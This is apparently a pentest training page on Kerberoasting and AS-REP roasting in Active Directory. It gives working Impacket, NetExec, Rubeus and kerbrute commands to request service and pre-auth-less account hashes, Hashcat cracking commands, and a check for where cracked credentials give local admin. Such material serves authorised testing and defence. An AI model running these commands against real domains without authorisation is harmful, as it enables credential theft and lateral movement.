---
title: Roast Kerberos (Kerberoast & AS-REP)
slug: roast-kerberos
area: active-directory
module: 13
order: 4
goal: Pull crackable Kerberos hashes for service and pre-auth-less accounts with only one low-priv credential (or none).
summary: How to Kerberoast and AS-REP roast — request the hashes with Impacket, NetExec or Rubeus, then crack them offline with Hashcat (modes 13100 and 18200).
prereqs: [For Kerberoasting any one valid domain credential, For AS-REP roasting just a username list (no credential needed), The DC reachable on 88 and 389]
seeAlso: [tool:impacket, tool:netexec, tool:rubeus, tool:hashcat, tool:kerbrute, map:active-directory, map:password-cracking]
references:
  - The Hacker Recipes: Kerberoasting | https://www.thehacker.recipes/ad/movement/kerberos/kerberoast
  - The Hacker Recipes: AS-REP roasting | https://www.thehacker.recipes/ad/movement/kerberos/asreproast
---

Two cheap wins against a domain, both ending in a hash you crack offline (so no lockout risk). **Kerberoasting** targets service accounts (any SPN); **AS-REP roasting** targets accounts that don't require Kerberos pre-authentication — and needs no credential at all.

## Kerberoast (service accounts with an SPN)

Any authenticated user can request a service ticket for any SPN; the ticket is encrypted with the service account's hash. Request them all, crack the weak ones.

```bash
GetUserSPNs.py -request -dc-ip DCIP DOMAIN/jsmith:'Winter2026!' -outputfile kerb.hash
nxc ldap DC -u jsmith -p 'Winter2026!' --kerberoasting kerb.hash
```

```cmd
Rubeus.exe kerberoast /outfile:kerb.hash
```

```bash
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
```

## AS-REP roast (accounts without pre-auth)

Accounts flagged "Do not require Kerberos preauthentication" hand out an AS-REP encrypted with their hash to anyone — no password needed.

```bash
GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass -dc-ip DCIP -format hashcat
nxc ldap DC -u jsmith -p 'Winter2026!' --asreproast asrep.hash
```

```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

## No valid username list yet?

Build one and validate it against the DC without triggering lockout:

```bash
kerbrute userenum -d DOMAIN --dc DCIP users.txt
```

## If it fails

- **No SPN accounts returned**: the domain may have none, or your account can't read them — try from a different user, or check with BloodHound.
- **Hash won't crack**: the password is strong. Try a rules set (`-r best64.rule`) or a bigger wordlist; otherwise this account is a dead end.
- **AS-REP returns nothing**: no accounts have pre-auth disabled (common) — move on.
- **Encryption type 17/18 (AES) Kerberoast hashes** (mode 19700/19800) crack far slower than RC4 (13100); confirm the mode matches the hash prefix.

## Verify

A cracked password is the win. Confirm it works and see where it is admin:

```bash
nxc smb TARGETS -u svc_sql -p 'CrackedPass!'       # (Pwn3d!) marks local admin
```
